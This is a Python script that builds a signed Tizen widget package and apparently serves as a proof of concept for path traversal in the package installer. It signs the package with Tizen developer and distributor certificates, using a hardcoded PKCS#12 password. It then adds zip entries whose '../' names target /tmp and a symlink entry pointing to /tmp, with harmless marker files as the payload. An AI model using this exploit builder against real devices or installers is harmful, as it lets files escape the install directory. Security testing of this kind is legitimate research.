import base64, hashlib, os, zipfile
from urllib.parse import quote
from lxml import etree
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography import x509 as cx509
BASE = os.path.dirname(os.path.abspath(__file__))
DSN = 'http://www.w3.org/2000/09/xmldsig#'
DSP = 'http://www.w3.org/2009/xmldsig-properties'
def q(t, ns=DSN): return '{%s}%s' % (ns, t)
def b64(c): return base64.b64encode(c.public_bytes(serialization.Encoding.DER)).decode()
def dig(b): return base64.b64encode(hashlib.sha512(b).digest()).decode()

def make_object(sid, role):
    obj = etree.Element(q('Object'), Id='prop')
    sps = etree.SubElement(obj, q('SignatureProperties'), nsmap={'dsp': DSP})
    for pid, elem, uri in (('profile', 'Profile', 'http://www.w3.org/ns/widgets-digsig#profile'),
                           ('role', 'Role', 'http://www.w3.org/ns/widgets-digsig#role-' + role)):
        sp = etree.SubElement(sps, q('SignatureProperty'), Id=pid, Target='#' + sid)
        etree.SubElement(sp, q(elem, DSP), URI=uri)
    sp3 = etree.SubElement(sps, q('SignatureProperty'), Id='identifier', Target='#' + sid)
    etree.SubElement(sp3, q('Identifier', DSP))
    return obj

PROP_DIGEST = {'AuthorSignature': 'aXbSAVgmAz0GsBUeZ1UmNDRrxkWhDUVGb45dZcNRq429wX3X+x6kaXT3NdNDTSNVTU+ypkysPMGvQY10fG1EWQ==', 'DistributorSignature': '/r5npk2VVA46QFJnejgONBEh4BWtjrtu9x/IFeLksjWyGmB/cMWKSJWQl7aU3YRQRZ3AesG8gF7qGyvKX9Snig=='}

def make_sig(sid, role, key, certs, refs):
    obj = make_object(sid, role)
    obj_c14n = etree.tostring(obj, method='c14n', with_comments=False)   # inclusive c14n ≈ c14n11 for this fragment
    root = etree.Element(q('Signature'), Id=sid, nsmap={None: DSN})
    si = etree.SubElement(root, q('SignedInfo'))
    etree.SubElement(si, q('CanonicalizationMethod'), Algorithm='http://www.w3.org/2001/10/xml-exc-c14n#')
    etree.SubElement(si, q('SignatureMethod'), Algorithm='http://www.w3.org/2001/04/xmldsig-more#rsa-sha512')
    for uri, data in refs:
        r = etree.SubElement(si, q('Reference'), URI=uri)
        etree.SubElement(r, q('DigestMethod'), Algorithm='http://www.w3.org/2001/04/xmlenc#sha512')
        dv = etree.SubElement(r, q('DigestValue')); dv.text = dig(data)
    rp = etree.SubElement(si, q('Reference'), URI='#prop')
    etree.SubElement(rp, q('Transforms'))
    etree.SubElement(rp[0], q('Transform'), Algorithm='http://www.w3.org/2006/12/xml-c14n11')
    etree.SubElement(rp, q('DigestMethod'), Algorithm='http://www.w3.org/2001/04/xmlenc#sha512')
    dvp = etree.SubElement(rp, q('DigestValue')); dvp.text = PROP_DIGEST[sid]
    sv = etree.SubElement(root, q('SignatureValue'))
    ki = etree.SubElement(root, q('KeyInfo')); xd = etree.SubElement(ki, q('X509Data'))
    for c in certs:
        xe = etree.SubElement(xd, q('X509Certificate')); xe.text = b64(c)
    root.append(obj)
    sig = key.sign(etree.tostring(si, method='c14n', exclusive=True), padding.PKCS1v15(), hashes.SHA512())
    sv.text = base64.b64encode(sig).decode()
    return etree.tostring(root, xml_declaration=True, encoding='UTF-8')

def build(wdir, out):
    files = {}
    for root_, _, names in os.walk(wdir):
        for n in names:
            p = os.path.join(root_, n)
            rel = os.path.relpath(p, wdir)
            if rel in ('author-signature.xml', 'signature1.xml'): continue
            files[rel] = open(p, 'rb').read()
    akey = serialization.load_pem_private_key(open(BASE + '/tpkauthor.key', 'rb').read(), None)
    acert = cx509.load_pem_x509_certificate(open(BASE + '/tpkauthor.crt', 'rb').read())
    ca = cx509.load_pem_x509_certificate(open(BASE + '/certificate-generator_0.1.4/data/tools/certificate-generator/certificates/developer/tizen-developer-ca.cer', 'rb').read())
    dkey, dcert, dchain = pkcs12.load_key_and_certificates(open(BASE + '/tizen-distributor-signer.p12', 'rb').read(), b'tizenpkcs12passfordsigner')
    sf = sorted(files)
    arefs = [(quote(p, safe=''), files[p]) for p in sf]
    asig = make_sig('AuthorSignature', 'author', akey, [acert, ca], arefs)
    dsig = make_sig('DistributorSignature', 'distributor', dkey, [dcert] + list(dchain or []),
                    [('author-signature.xml', asig)] + arefs)
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr('author-signature.xml', asig)
        for p in sf: z.writestr(p, files[p])
        z.writestr('signature1.xml', dsig)
        z.writestr('d/../../../../../../../../../../tmp/travA', b'TRAVA-MARKER\n')
        z.writestr('../../../../../../../../../../tmp/travB', b'TRAVB-MARKER\n')
    # symlink entry: ln -> /tmp (external_attr high 16 bits = mode|S_IFLNK)
    zi = zipfile.ZipInfo('ln')
    zi.create_system = 3
    zi.external_attr = (0o120777 << 16)
    with zipfile.ZipFile(out, 'a', zipfile.ZIP_DEFLATED) as z:
        z.writestr(zi, b'/tmp')
    print('built', out, os.path.getsize(out))

if __name__ == '__main__':
    build(os.path.join(BASE, 'wgttrav'), os.path.join(BASE, 'wgttrav.wgt'))
